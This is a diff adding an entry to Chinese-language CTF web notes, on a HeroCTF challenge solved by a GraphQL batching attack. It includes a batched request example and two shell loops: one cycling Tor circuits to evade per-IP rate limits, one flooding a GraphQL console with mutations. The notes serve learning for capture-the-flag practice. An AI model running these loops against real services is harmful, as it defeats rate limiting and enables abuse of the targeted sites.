@@ -1707,3 +1707,33 @@ await page.goto(params.get("url"));
 //会返回file:///flag.txt
 ```
 - file协议不是大小写敏感的。上面的过滤也可以用`filE:///http/../flag.txt`绕过。
+208. [Best_Schools](https://siunam321.github.io/ctf/HeroCTF-v5/Web/Best-Schools/)
+- [GraphQL Batching Attack](https://checkmarx.com/blog/didnt-notice-your-rate-limiting-graphql-batching-attack/)利用。在一个request中插入多个query，从而绕过网站自带的rate limit。不仅仅适用于查询用的query，也适用于用于更改数据的mutation query。
+```
+POST /graphql HTTP/1.1
+[
+  {
+    “variables”: { “id”: 1 },
+    “query”: “query User($id: Int!) { … }” //查询的query
+  },
+  {
+    “variables”: { “id”: 2 },
+    “query”: "mutation { func(param: \"value\"){id, num} }" //更改数据的mutation query，有点像调用函数
+  }
+]
+```
+- 一些graphql入门资料
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
+  - https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
+- 利用匿名网络服务tor绕过rate limit：
+```sh
+while true; do service tor restart; sleep 1; curl --socks5-hostname localhost:9050 -i -s -k -X POST -H $'Content-Type: application/json'  --data-binary $'{\"query\":\"mutation { func(param: \\\"value\\\"){id, num} }\"}' 'http://example.com/graphql';done
+```
+不断重启tor然后用重启后的tor匿名连接。因为每次匿名连接不会被服务器判断为同一个人，于是绕过limit。
+- 直接向console发送mutation query绕过rate limit
+```sh
+while true; do curl -i -s -k -X $'POST' \
+    -H $'Content-Type: application/json' -H $'Origin: http://example.com' \
+    --data-binary $'{\"query\":\"mutation { func(param: \\\"value\\\"){id, num} func(param: \\\"value\\\"){id, num} }\"}' \
+    $'http://example.com/graphql/console'; done
+```
